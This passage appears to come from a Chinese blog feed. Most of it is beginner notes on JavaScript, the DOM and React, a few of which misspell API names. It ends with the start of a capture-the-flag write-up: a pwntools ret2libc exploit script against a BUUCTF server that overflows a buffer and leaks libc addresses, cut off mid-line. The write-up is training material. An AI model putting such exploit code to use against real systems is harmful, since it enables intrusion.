JS字面量<br>**数字字面量**<br></code></pre></td></tr></table></figure>3.141001123e5<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串字面量**</span><br>单双引号皆可<br></code></pre></td></tr></table></figure>"jobe d"'lddd sd'<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**表达式字面量**</span><br></code></pre></td></tr></table></figure>7+102 * 8<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**数组字面量**</span><br></code></pre></td></tr></table></figure>[40, 100, 200]<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象字面量**</span><br></code></pre></td></tr></table></figure>{firstname:"John", lastname:"Done"}<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**函数字面量**</span><br></code></pre></td></tr></table></figure>function myFunc(am,bm){    return a+b;}<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">**JS变量**</span><br>用<span class="hljs-keyword">var</span>定义<br></code></pre></td></tr></table></figure>var x, length；<p>x = 5；<br>length = 6；</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">**JS注释**<br>双斜杠```//```<br>**且JS大小写敏感**<br>### JS语句<br></code></pre></td></tr></table></figure><p>可以用分号结尾一句代码<br>可以多写空格，提高可读性</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS数据类型和对象<br>new关键字指定类型<br></code></pre></td></tr></table></figure><p>var x=  new Number<br>var ca= new String<br>var fl= new boolean</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**对象**</span><br>对象有<span class="hljs-strong">**属性**</span>和<span class="hljs-strong">**方法**</span><br></code></pre></td></tr></table></figure><p>定义一个对象</p><p>var car = { name: “Fiat”, model:500, color: “white” };<br>每个值用name: value表示，值之间用逗号分割</p><p>访问对象属性</p><p>car.name<br>car[“color”]<br>两种方式均可</p><p>对象方法<br>创建对象：<br>var person{<br>    name:”DAvid”,<br>    lasy:”DAAA”,<br>    methodName:function(){<br>    return name + “ “ + lasy<br>    }<br>}<br>即在类内定义好了方法<br>调用：<br>person.methodName()<br>即可</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS函数<br>定义函数<br></code></pre></td></tr></table></figure><p>function funcname(var1,var2){<br>    //执行代码<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">不用声明参数的数据类型<br>### JS事件<br>#### HTML事件<br>如：HTML页面完成加载<br>HTML input字段发生改变<br>HTML按钮被点击<br>当发生事件时，可以用JS做些事情，语法如下<br></code></pre></td></tr></table></figure><some-HTML-element some-event="JavaScript 代码">如：<button onclick="this.innerHTML=Date()">现在的时间是</button>代码将修改自身元素的内容  this.innerHTML可以达到效果<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">常见的<span class="hljs-selector-tag">HTML</span>事件<br></code></pre></td></tr></table></figure><p>onchange HTML元素改变<br>onclick 点击HTML元素<br>onmouseover 鼠标移动到元素上</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS字符串<br>可以用索引位置，从<span class="hljs-number">0</span>开始访问字符<br></code></pre></td></tr></table></figure><p>var charn = str[9]</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">字符串中的引号，不要跟字符串的引号相同，一双一单<br><span class="hljs-strong">**字符串长度**</span><br></code></pre></td></tr></table></figure><p>var txt = “ABNCNJMMMM”<br>var num = txt.length;<br>length是内置属性</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**字符串可以是对象**</span><br></code></pre></td></tr></table></figure><p>var fristname=new String(“bob”)<br>typeof fristname // return String</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">String可以用```+```链接起来<br>数字与字符串相加，将数字自动转换为字符串后，返回字符串<br></code></pre></td></tr></table></figure><p>z = “hello” + 5<br>hello5</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS条件语句<br>与C++一样<br>switch也一样<br><br>### JS for循环<br></code></pre></td></tr></table></figure><p>for (var i=0;i&lt;cars.length;i++)<br>{<br>    document.write(cars[i] + “<br>“);<br>}</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">也与C</span>++<span class="hljs-comment">一样，只是第一个参数是var定义的变量</span><br><span class="hljs-comment">for</span>--<span class="hljs-comment">in循环</span><br></code></pre></td></tr></table></figure><p>var person = {fname:”boll”, lname:”vil”, age:56};<br>for(x in person)<br>{<br>    txt = txt + person[x];<br>}</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS类型转换<br></code></pre></td></tr></table></figure><p>var a<br>a=String(123)<br>var b<br>b = Number(“3.14”)</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### JS正则表达式（RE）<br>如<br></code></pre></td></tr></table></figure><p>var patt = /runoob/i</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">```<br>/runoob/是正则表达式主题，用于检索<br>i是修饰符，表示不分大小写<br></code></pre></td></tr></table></figure><p>正则表达式常用于检索和替换中</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">var str <span class="hljs-operator">=</span> document.getElementById(<span class="hljs-string">&quot;DEmo&quot;</span>).innerHTML<span class="hljs-comment">;</span><br>var n <span class="hljs-operator">=</span> str.search(<span class="hljs-string">&quot;Runoob&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>replace:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> str = document.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML;<br><span class="hljs-keyword">var</span> txt = str.<span class="hljs-built_in">replace</span>(<span class="hljs-regexp">/microsoft/i</span>,<span class="hljs-string">&quot;Runoob&quot;</span>);<br>修改了txt内容，str未变<br><br></code></pre></td></tr></table></figure><h3 id="JS表单验证"><a href="#JS表单验证" class="headerlink" title="JS表单验证"></a>JS表单验证</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">validateForm</span>(<span class="hljs-params"></span>)</span><br><span class="language-javascript">&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> x=<span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">&quot;myForm&quot;</span>][<span class="hljs-string">&quot;fname&quot;</span>].<span class="hljs-property">value</span>;</span><br><span class="language-javascript">    <span class="hljs-keyword">if</span>(x == <span class="hljs-literal">null</span>||x == <span class="hljs-string">&quot;&quot;</span>)</span><br><span class="language-javascript">    &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;姓必须填写&quot;</span>);</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span> = <span class="hljs-string">&quot;demo.php&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm()&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>姓:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span> = <span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span> = <span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span> = <span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JS的this"><a href="#JS的this" class="headerlink" title="JS的this"></a>JS的this</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">在方法中，<span class="hljs-keyword">this</span>表示该方法所属的对象<br>fullName : function()&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.firstname + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-keyword">this</span>.lastname;<br>&#125;<br>单独使用，<span class="hljs-keyword">this</span>是全局对象<br>事件中的<span class="hljs-keyword">this</span><br>在HTML事件句柄中，<span class="hljs-keyword">this</span>指向了接收事件的HTML元素<br>&lt;button onclick=<span class="hljs-string">&quot;this.style.display =&#x27;none&#x27;&quot;</span>&gt;<br>点我后就消失咯<br>&lt;/button&gt;<br></code></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DOM(Document Object Model)<strong>文档对象模型</strong></p><h3 id="DOM节点"><a href="#DOM节点" class="headerlink" title="DOM节点"></a>DOM节点</h3><p>DOM节点树<br><img src="/2022/06/30/front/pe.png"><br>节点之间拥有层级关系<br>常用<strong>父</strong>，<strong>子</strong>，<strong>同胞</strong>等术语描述这些关系</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>DOM 教程<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>DOM 课程1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello world!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>此代码中<br>文本结点”hello world!”的父节点是<code>&lt;p&gt;</code>节点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs <h1>```与```<p>```节点是同胞结点">### DOM方法<br>HTML DOM方法是我们可以在节点（即HTML元素）上执行的动作<br>HTML DOM属性是我们可以在节点设置和修改的值<br>#### 编程接口<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>var elemnt = document.getElementById(“intro”);</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">以及一些常用的方法<br></code></pre></td></tr></table></figure><p>appendChild(node)插入新的子节点<br>removeChild(node)删除字节点</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean">### DOM属性<br>**innerHTML属性**<br>获取元素内容的最简单的方法是使用innerHTML属性<br>innerHTML属性对于获取和替换HTML元素的内容很有用<br>注意**inner**<br>**nodeValue属性**<br>nodeValue属性规定节点的值<br>元素节点的nodeValue是undefined或null<br>文本节点的nodeValue是文本本身<br>属性节点的nodeValue是属性值<br>### DOM访问<br>访问HTML元素（节点）<br>**getElementById()方法**<br></code></pre></td></tr></table></figure><p>document.getElementById(“id”);</p><p id="intro">helloworld</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">id相对于，以起到寻找的作用<br>**<span class="hljs-built_in">getElementsByTagName</span>()方法**<br>该方法会选取所有该标签的<span class="hljs-selector-tag">HTML</span>元素<br></code></pre></td></tr></table></figure>document.getElementByTagName("p")<p>hello</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean">**getElementsByClassName()方法**<br>### DOM修改<br>**修改HTML内容**<br></code></pre></td></tr></table></figure><script>document.getElementById("intro").innerHTML = "new words";</script><p id="intro"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**修改HTML样式**</span><br></code></pre></td></tr></table></figure><p id="p1">Hello</p><p id="p2">hello</p><script>document.getElementById("p2").style.color = "red";document.getElementById("p2").style.fontFamily = "Arial";document.getElementById("p2").style.fontSize = "700";</script><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">**添加新的HTML元素**</span><br></code></pre></td></tr></table></figure><div id="div1"><p id="p1">p1</p><p id="p2">p2</p></div><script>var para = document.createElement("p");var node = document.createTextNode("new para");para.appendChild(node);var element = document.getElementById("div1");element.appendChild(para);</script><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">### DOM元素<br>**创建新的<span class="hljs-selector-tag">HTML</span>元素<span class="hljs-built_in">-createElement</span>()**<br>如上方代码一样<br>先创建，再添加到已有的元素上<br>**<span class="hljs-built_in">insertBefore</span>()方法**<br>可以在指定元素节点之前添加该元素<br></code></pre></td></tr></table></figure>insertBefore(src,des)<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">注意记得为各个节点命名，方便操作<br>**<span class="hljs-built_in">replaceChild</span>()方法**<br>替换目标元素<br></code></pre></td></tr></table></figure>replaceBefore(src,des);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>## React<br>### React部署<br>利用官方cdn链接<br></code></pre></td></tr></table></figure><script src="cdnurl"></script><script src="https://cdn.staticfile.org/react/16.4.0/umd/react.development.js"></script><script src="https://cdn.staticfile.org/react-dom/16.4.0/umd/react-dom.development.js"></script><script src="https://cdn.staticfile.org/babel-standalone/6.26.0/babel.min.js"></script><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"><br>实例中我们引入了三个库： react.development.<span class="hljs-keyword">min</span>.js 、react-dom.development.<span class="hljs-keyword">min</span>.js 和 babel.<span class="hljs-keyword">min</span>.js：<br>**react.<span class="hljs-keyword">min</span>.js**是核心库<br>**react-dom.<span class="hljs-keyword">min</span>.js**提供与DOM相关的功能<br>**babel.<span class="hljs-keyword">min</span>.js**Babel可以将ES6代码转为ES5，提高兼容性<br>### React元素渲染<br>#### 将元素渲染到DOM中<br>传递给<span class="hljs-string">``</span><span class="hljs-string">`ReactDOM.render()`</span><span class="hljs-string">``</span><br></code></pre></td></tr></table></figure>const element = <h1>HEllo</h1>ReactDOM.render(    element,    document.getElementById('example'));即可将element内容传给example为id的元素<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 更新元素渲染<br>因为React元素是不可变的，修改时，需要用新元素进行替换<br></code></pre></td></tr></table></figure>function tick(){    const element = (        <div>            <h1>现在是{new Date().toLocateTimeString()}.</h1>        </div>     );     ReactDOM.render(         element,         document.getElementById('example')         );}<p>setInterval(tick,1000);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">每<span class="hljs-number">1000</span>ms替换一次，达到计时效果<br>### React JSX<br>JSX是一种语法<br>在react中代替常规的JavaScript<br>如<br></code></pre></td></tr></table></figure><p>const element = </p><h1>HEllo</h1>;<p></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">**注意**<br>由于JSX是Javascript语言，故一些标识符如<span class="hljs-keyword">class</span>最好用<span class="hljs-symbol">className</span>代替<br></code></pre></td></tr></table></figure><p>var myDivElement = <div classname="foo">;</div></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">#### 在JSX中插入JS表达式<br></code></pre></td></tr></table></figure><p>ReactDOM.render(<br>    <div><br>        <h1>{i == 1 ? ‘True!’ : “False!”}</h1><br>    </div><br>    ,<br>    document.getElementById(‘example’)<br>);<br>就是JS套HTML再套JS的感觉</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React组件<br></code></pre></td></tr></table></figure><p>function HellowMessage(props){<br>    return </p><h1>HElloe world</h1>;<br>}<p></p><p>const element = <HelloMessage>;</HelloMessage></p><p>ReactDOM.render(<br>    element<br>    ,<br>    document.getElementById(‘example’)<br>    );</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-strong">**第一步**</span><br>使用函数定义一个组件<br><br><span class="hljs-strong">**第二步**</span><br>用一个元素调用这个组件<br></code></pre></td></tr></table></figure><p>const element = <HelloMessage></HelloMessage></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">最后调用这个元素即可<br>#### 复合组件<br></code></pre></td></tr></table></figure><p>function Name(props) {<br>    return </p><h1>网站名称：{props.name}</h1>;<br>}<br>function Url(props) {<br>    return <h1>网站地址：{props.url}</h1>;<br>}<br>function Nickname(props) {<br>    return <h1>网站小名：{props.nickname}</h1>;<br>}<br>function App() {<br>    return (<br>    <div><br>        <Name name="菜鸟教程"><br>        <Url url="http://www.runoob.com"><br>        <Nickname nickname="Runoob"><br>    </Nickname></Url></Name></div><br>    );<br>}<p></p><p>ReactDOM.render(<br>     <App>,<br>    document.getElementById(‘example’)<br>);</App></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs clean">可以看出，用props.name时，传递参数要写，name =  <span class="hljs-string">&quot;...&quot;</span><br>### React State（状态）<br>#### 将生命周期方法添加到类中<br>如<br>每当Clock组件第一次加载到 DOM 中的时候，我们都想生成定时器，这在 React 中被称为挂载。<br><br>同样，每当 Clock 生成的这个 DOM 被移除的时候，我们也会想要清除定时器，这在 React 中被称为卸载。<br></code></pre></td></tr></table></figure><p>class Clock extends React.Component {<br>  constructor(props) {<br>    super(props);<br>    this.state = {date: new Date()};<br>  }</p><p>  componentDidMount() {<br>    this.timerID = setInterval(<br>      () =&gt; this.tick(),<br>      1000<br>    );<br>  }</p><p>  componentWillUnmount() {<br>    clearInterval(this.timerID);<br>  }</p><p>  tick() {<br>    this.setState({<br>      date: new Date()<br>    });<br>  }</p><p>  render() {<br>    return (<br>      <div><br>        <h1>Hello, world!</h1><br>        <h2>现在是 {this.state.date.toLocaleTimeString()}.</h2><br>      </div><br>    );<br>  }<br>}</p><p>ReactDOM.render(<br>  <Clock>,<br>  document.getElementById(‘example’)<br>);</Clock></p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pf">componentDidMount() 与 componentWillUnmount() 方法被称作生命周期钩子。<br><br>在组件输出到 DOM 后会执行 componentDidMount() 钩子，我们就可以在这个钩子上设置一个定时器。<br><br>this.timerID 为定时器的 ID，我们可以在 componentWillUnmount() 钩子中卸载定时器。代码执行顺序：<br><br>当 <span class="hljs-variable">&lt;Clock /&gt;</span> 被传递给 ReactDOM.render() 时，React 调用 Clock 组件的构造函数。 由于 Clock 需要显示当前时间，所以使用包含当前时间的对象来初始化 this.<span class="hljs-keyword">state</span> 。 我们稍后会更新此状态。<br><br>React 然后调用 Clock 组件的 render() 方法。这是 React 了解屏幕上应该显示什么内容，然后 React 更新 DOM 以匹配 Clock 的渲染输出。<br><br>当 Clock 的输出插入到 DOM 中时，React 调用 componentDidMount() 生命周期钩子。 在其中，Clock 组件要求浏览器设置一个定时器，每秒钟调用一次 tick()。<br><br>浏览器每秒钟调用 tick() 方法。 在其中，Clock 组件通过使用包含当前时间的对象调用 <span class="hljs-built_in">set</span>State() 来调度UI更新。 通过调用 <span class="hljs-built_in">set</span>State() ，React 知道状态已经改变，并再次调用 render() 方法来确定屏幕上应当显示什么。 这一次，render() 方法中的 this.<span class="hljs-keyword">state</span>.date 将不同，所以渲染输出将包含更新的时间，并相应地更新 DOM。<br><br>一旦 Clock 组件被从 DOM 中移除，React 会调用 componentWillUnmount() 这个钩子函数，定时器也就会被清除。<br><span class="hljs-comment">### React Props</span><br>props用于传递数据<br></code></pre></td></tr></table></figure><p>function HelloMe(props){<br>    return </p><h1>Hello {props.name}!</h1><br>}<p></p><p>const element= <HelloMe name="kasw">;</HelloMe></p><p>ReactDOM.render(<br>    element,<br>    document.getElementById(‘example’)<br>);</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">### React 事件处理<br>HTML事件处理：<br></code></pre></td></tr></table></figure><button onclick="activateLasers()">激活按钮</button><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">React:</span><br></code></pre></td></tr></table></figure><button onclick="{activateLasers}">激活按钮</button><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">react中使用驼峰写法，且传入的是函数，而不是字符串<br>### React 条件渲染<br>登录界面判断<br>是输出**欢迎回来**<br>还是**请先注册**<br></code></pre></td></tr></table></figure>function UserGreeting(props) {  return <h1>欢迎回来!</h1>;}<p>function GuestGreeting(props) {<br>  return </p><h1>请先注册。</h1>;<br>}<br>function Greeting(props) {<br>  const isLoggedIn = props.isLoggedIn;<br>  if (isLoggedIn) {<br>    return <UserGreeting>;<br>  }<br>  return <GuestGreeting>;<br>}<p></p><p>ReactDOM.render(<br>  // 尝试修改 isLoggedIn={true}:<br>  <Greeting isloggedin="{false}">,<br>  document.getElementById(‘example’)<br>);<br>```</Greeting></p></GuestGreeting></UserGreeting></some-HTML-element>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>泄露出来的地址的处理</title>
    <link href="/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <url>/2022/05/30/%E6%B3%84%E9%9C%B2%E5%87%BA%E6%9D%A5%E7%9A%84%E5%9C%B0%E5%9D%80%E7%9A%84%E5%A4%84%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一道简单的ROP题"><a href="#一道简单的ROP题" class="headerlink" title="一道简单的ROP题"></a>一道简单的ROP题</h1><h2 id="但是不是那么简单"><a href="#但是不是那么简单" class="headerlink" title="但是不是那么简单"></a>但是不是那么简单</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><pre><code class="hljs python3">from pwn import*<br>from LibcSearcher import*<br>p = remote(&#x27;node4.buuoj.cn&#x27;,28006)<br>#p = process(&#x27;./rop&#x27;)<br>elf = ELF(&#x27;./rop&#x27;)<br>put_plt_addr = elf.plt[&#x27;puts&#x27;]<br>put_got_addr = elf.got[&#x27;puts&#x27;]<br>vuln = 0x4006ad<br>pop_rdi = 0x400733<br><br><br>payload1 = b&#x27;A&#x27;*40 + p64(pop_rdi) + p64(put_got_addr) + p64(put_plt_addr) + p64(vuln)<br><br>p.recvuntil(&#x27;story!\n&#x27;)<br>p.sendline(payload1)<br><br>put_got = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))<br>print(hex(put_got))<br>libc = LibcSearcher(&#x27;puts&#x27;,put_got)<br>libc_base = put_got - libc.dump(&#x27;puts&#x27;)<br>sys = libc_base + 